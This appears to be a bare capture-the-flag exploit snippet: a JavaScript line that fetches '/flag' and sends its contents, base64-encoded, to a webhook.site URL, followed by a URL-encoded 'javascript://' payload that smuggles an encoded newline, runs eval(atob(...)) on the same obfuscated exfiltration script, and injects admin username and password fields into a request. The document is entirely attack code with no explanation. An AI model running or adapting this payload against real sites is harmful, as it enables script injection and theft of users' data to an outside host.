Javascript Part:
```
fetch('/flag').then(x => x.text().then(y => {fetch('https://webhook.site/ae145c0d-4496-4230-bc5e-ff4e38004e84/'+btoa(y))}))
```

Payload:
```
javascript://admin.pk/;%250D%250A;eval(atob(%27ZmV0Y2goJy9mbGFnJykudGhlbih4ID0%2BIHgudGV4dCgpLnRoZW4oeSA9PiB7ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzIzNDYzZTRlLTNkNzYtNDY0YS1iNzc5LTRhYWE1NjQ4MjMyMC8nK2J0b2EoeSkpfSkp%27))","username":"admin","pass":"P@ss
```